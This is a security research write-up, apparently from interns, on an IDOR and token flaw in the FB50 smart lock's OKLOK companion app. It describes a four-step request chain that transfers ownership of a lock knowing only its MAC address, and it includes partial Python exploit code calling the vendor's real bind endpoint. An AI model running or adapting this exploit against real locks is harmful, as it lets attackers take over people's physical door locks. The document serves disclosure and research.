## Executive Summary 

During our internship at SecureLayer7, we compromised the FB50 smart lock
via its companion app. An information disclosure vulnerability,
chained together with poor token management lead to a complete transfer of
ownership of the lock from the user to the attacker's account.

## Product Description 

The lock in question is the FB50 smart lock, manufactured by Shenzhen
Dragon Brother Technology Co. Ltd. This lock is sold under multiple brands
across many ecommerce sites, and has over, an estimated, 5000 users.
Judging by the download count on the Play Store, for its app. This is
excluding the iOS App Store downloads.

The lock pairs to a phone via bluetooth, and requires the OKLOK app from
the Play/App Store to function. The app requires the user to create an
account before further functionality is available. 
The app facilitates the fingerprint unlock configuration on the
lock, and unlocking from a range via bluetooth.

## Approach

Our initial attempt was to perform a replay of the captured
Bluetooth packets. Two attempts at this were performed. First, we tried
replaying the packets in the HCI dump log, captured on an Android device.
In the second try, we used gattacker running on a Raspberry Pi, in an
attempt to spoof the lock's MAC address and make the app communicate with
the RPi instead. 

We soon realized that the data being written during the "unlock" requests,
was encrypted, and hence the replays were unsuccessful. We then decided to
take a crack at the companion app instead, in which we ended up finding
the information disclosure and token related bugs.

## Findings Overview

1. IDOR in the user ID, exposing user data
2. Knowing just the MAC address of the lock alone, a series of requests
can be chained to unbind the existing user to the lock and bind a new one

## Technical Description

The entire exploit is a 4 step process consisting of authenticated 
HTTP requests:
1. Using the lock's MAC (obtained via a simple bluetooth scan in the 
vicinity), get the barcode and lock ID
2. Using the barcode, fetch the user ID
3. Using the lock ID and user ID, unbind the user from the lock
4. Provide a new name, attacker's user ID and the MAC to bind the attacker
to the lock

## That's it!

You should have the lock transferred to your account. The severity of this
issue lies in the fact that the original owner completely loses access to
their lock. They can't even "rebind" to get it back, since the current owner 
(the attacker) needs to authorize that. 

## Exploit Code

```python

    resp = requests.request("POST", url, json=data, headers=h)
    lockinfo=resp.json()
    lock['barcode'] = lockinfo['result']['barcode']
    lock['lockid'] = lockinfo['result']['id']
    lock['name'] = lockinfo['result']['name']

    resp = requests.request("POST", url, json=data, headers=h)
    lockinfo=resp.json()
    lock['userid'] = lockinfo['result']['userId']

    data = {
        "lockId": lock['lockid'],
        "userId": lock['userid']
    }
    resp = requests.request("POST", url, json=data, headers=h)


def bind(attacker_id, h):
    url = "https://app.oklok.com.cn/oklock/lock/bind"
    data = {
        "name": lock['name'],
        "userId": attacker_id,
        "mac": lock['mac']
    }
    resp = requests.request("POST", url, json=data, headers=h)


if __name__ == "__main__":

    try:
        attacker_id = sys.argv[1]
        mac = sys.argv[2]
    except IndexError:
        print("error: missing arguments")
        print("usage: " + sys.argv[0] + ' [id] [mac]')
        sys.exit()

    header = {
